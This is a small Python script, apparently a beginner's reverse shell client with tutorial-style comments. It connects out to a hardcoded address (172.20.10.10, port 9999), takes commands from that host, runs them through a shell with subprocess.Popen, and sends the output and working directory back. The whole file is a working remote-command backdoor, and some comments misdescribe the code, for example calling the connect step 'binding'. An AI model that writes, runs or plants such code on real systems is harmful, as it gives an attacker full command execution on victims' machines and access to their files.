import socket
import os  # Standands for operating system
import subprocess  # sub process are the processes that exist on windows system
'''
os and subprocess file is used execute the instruction which client.pt will recevice
'''
s = socket.socket()
host =  '172.20.10.10'
port = 9999

# Binding the host and port

s.connect((host,port))

while True:
    # 1024 is the size of the chuck in which data will receive
    data = s.recv(1024)
    # Here first it decode data or convert byte to string and then perform slicing
    if data[:2].decode('utf-8') == 'cd':
        # Here chdir means change directory 
        os.chdir(data[3:].decode('utf-8'))
    if len(data)>0:
        # Here Popen opens a terminal on computer
        # Popen opens a process in which data[:].decode('utf-8') will execute
        # shell give us access to shell commands
        cmd = subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        # Done this the client or friend can see what we are doing
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,'utf-8')
        # Here we stroing the current working directory in a variable
        currentWD = os.getcwd() + '>'
        s.send(str.encode(output_str + currentWD))

        print(output_str)

